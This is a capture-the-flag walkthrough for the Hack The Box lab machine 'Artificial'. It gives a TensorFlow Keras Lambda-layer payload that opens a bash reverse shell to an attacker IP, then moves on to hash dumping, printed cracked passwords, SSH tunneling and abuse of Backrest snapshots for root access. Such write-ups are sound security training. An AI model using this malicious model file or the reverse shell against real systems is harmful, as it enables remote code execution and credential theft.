---
hidden: true
---

# Artificial

## Machine Info





## Port Scanning

```bash
nmap -T4 -A -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.74

Nmap scan report for 10.10.11.74
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```



## Web Enumeration

Change the /etc/hosts file to allow the visualization of the web page.

```bash
sudo nano /etc/hosts

10.10.11.74     artificial.htb
```

Registering to the website we'll moving to upload file page login.

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

### Tensorflow-cpu 2.13.1 RCE vulnerability

If we read the requirements document, it indicate that for create the model we have to use `tensorflow-cpu==2.13.1` .&#x20;

Searching online we have a PoC of Code Injection vulnerability in this version of Tensorflow.

{% embed url="https://github.com/tensorflow/tensorflow/issues/82214" %}

Now which we are in, craft the payload with Github code and add a simple reverse shell.

{% code title="craft_payload.py" %}
```python
import tensorflow as tf

def exploit(x):
  import os
  os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.109/9009 0>&1'")
  return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile(optimizer='adam', loss='mse')
model.save("model.h5")
```
{% endcode %}

Try to build a docker environment provide by the website:

```bash
sudo docker build -t dev_env .
sudo docker run -it --rm -v $(pwd):/code dev_env
```

Then, run the script inside a docker environment

```bash
python3 craft_payload.py
```

This script will create `model.h5` file, that is the model with the payload inside.

THEN THE PAYLOAD WAS CREATE, start a listener

```bash
penelope
listeners add 10.10.14.109 9009
```

Now upload the model on website and press "View Predictions" to execute it by the server.

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

And we have shell

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation to User

Starting with linpeas enumeration.

```bash
cp /usr/share/peass/linpeas/linpeas.sh . 

./linpeas.sh
```



### User.db file found

```bash
sqlite3 users.db

SELECT * FROM user;

#output
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0

```



<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

We found 2 password

```
gael:mattp005numbertwo
royer:marwinnarak043414036
```

### User.flag

Now with the password, we can gain access vie SSH with gael user

```bash
ssh gael@10.10.11.74
> mattp005numbertwo
```

Print the user flag

```bash
cat user.txt
```

## Privilege Escalation to Root



```
tcp       50      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      814/python3                         
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```

### Port Forwarding (SSH Tunneling)

```bash
ssh -L 9898:10.10.11.74:9898 gael@10.10.11.74
```

Now we can view the local hosted port 8989 in our machine

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Backrest 1.7.2 - Backup Solution

_Backrest is a web-accessible backup solution built on top of_ [_restic_](https://restic.net/)_. Backrest provides a WebUI which wraps the restic CLI and makes it easy to create repos, browse snapshots, and restore files. Additionally, Backrest can run in the background and take an opinionated approach to scheduling snapshots and orchestrating repo health operations._

{% embed url="https://github.com/garethgeorge/backrest" %}

If we run the `id` command we can view that the user `gael` is in the `sysadm` group.&#x20;

```bash
> id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

And if we search in the linpeas result we view that there is`/var/backups` directory able to view with `sysadm` group privileges.

```
ls /var/backup
[...snip...]
-rw-r-----  1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz
[...snip...]
```

Open a python http server on this directory and download in out machine.

```bash
# target machine
python3 -m http.server 8800

# attack machine
wget http://10.10.11.74:8800/backrest_backup.tar.gz
```

Now extract the content

```bash
tar -xvf backrest_backup.tar.gz -C backrest_backup
```

In the directory there is a config file with Bcrypt credential

```bash
cat backrest_backup/backrest/.config/backrest/config.json

{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

The password seems to be a base64

```bash
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d         
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

Trying to crack with John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backrest_creds.txt
```

Crack it!

```
backrest_root:!@#$%^
```

We login into Backrest portal

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we can try to set up Backrest and run commands to escalate the privileges

Create a Backrest Repository

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And now create a Plan with `root` directory.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Run a backup from out Plan just created

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

And now we can execute the command inside a snapshot just made.

For example we can list the directory

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Root.flag

With the command `Dump` we can print the root flag file from the snapshot files.

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>





